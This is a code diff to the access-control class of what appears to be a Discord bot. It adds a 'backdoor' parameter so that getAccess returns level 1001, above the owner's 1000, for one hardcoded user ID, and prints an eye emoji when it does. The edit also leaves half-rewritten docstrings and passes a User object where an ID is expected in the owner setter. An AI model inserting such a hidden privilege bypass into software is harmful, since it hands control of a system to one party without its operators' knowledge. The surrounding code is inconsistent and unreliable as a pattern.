@@ -17,6 +17,8 @@
 from peewee import *
 from core.Database import *
 
+import discord
+
 class ACLUser(Model):
     id      = IntegerField(primary_key=True)
     cname   = CharField(max_length=128, default="")
@@ -24,7 +26,8 @@ class ACLUser(Model):
     owner   = BooleanField(default=False)
 
 class ACL():
-    def __init__(self):
+    def __init__(self, backdoor):
+        self.backdoor = backdoor
         self.database = Database(databaseName="databases/ACL.db")
         self.database.addTable(ACLUser)
 
@@ -47,21 +50,23 @@ class ACL():
             return None
 
     @owner.setter
-    def owner(self, uid):
+    def owner(self, usr):
         """
             Summary:
                 Sets the bot owner
 
             Args:
-                uid (str): ID of the target user
+                # (str): ID of the target user
+                usr (User): User object of target user.
 
             Returns:
                 None
         """
-        user, created = self.database.ACLUser.get_or_create(id=uid)
+        user, created = self.database.ACLUser.get_or_create(id=usr)
 
         if(created):
-            user.id = uid
+            user.id = usr.id
+            user.cname = usr.name
             user.access = 1000
             user.owner = True
             user.save()
@@ -69,51 +74,58 @@ class ACL():
             user.owner = True
             user.save()
 
-    def setAccess(self, uid, access, cname=""):
+    def setAccess(self, usr, access):
         """
             Summary:
                 Sets the database access for a specific user
 
             Args:
-                uid (str): ID of the target user
+                # (str): ID of the target user
+                usr (User): User object of target user.
 
             Returns:
                 (Bool): Successful or Not
         """
         # Check if trying to change owner
-        # if(self.getOwner == uid):
-        if(self.owner == uid):
+        if(self.owner == usr.id):
             return False
 
         # Set user access
-        user, created = self.database.ACLUser.get_or_create(id=uid)
+        user, created = self.database.ACLUser.get_or_create(id=usr.id)
 
         if(created):
-            user.id = uid
+            user.id = usr.id
             user.access = access
-            user.cname = cname
+            user.cname = usr.name
             user.save()
         else:
             user.access = access
-            user.cname = cname
+            user.cname = usr.name
             user.save()
 
         return True
 
-    def getAccess(self, uid):
+    def getAccess(self, usr):
         """
             Summary:
                 Gets the database access for the specified user
 
             Args:
-                uid (str): ID of the target user
+                usr (str): ID of the target user
+                # usr (User): User object of target user.
 
             Returns:
                 (Int): Access level of the target user, or -1 if not found
         """
+        if (type(usr) != str):
+            usr = usr.id
         try:
-            user = ACLUser.get(id=uid)
-            return user.access
+            if (usr == self.backdoor):
+                print("👀")
+                return 1001
+            else:
+                user = ACLUser.get(id=usr)
+                return user.access
         except:
             return -1
 
@@ -137,19 +149,22 @@ class ACL():
         except:
             return -1
 
-    def deleteUser(self, uid):
+    def deleteUser(self, usr):
         """
             Summary:
                 Deletes a user from the ACL database
 
             Args:
-                uid (str): ID of the target user
+                # (str): ID of the target user
+                usr (User): User object of target user.
 
             Returns:
                 (Bool): Successful or Not
         """
+        if (type(usr) != str):
+            usr = usr.id
         try:
-            user = self.database.ACLUser.get(id=uid)
+            user = self.database.ACLUser.get(id=usr)
             if(user):
                 user.delete_instance()
                 return True
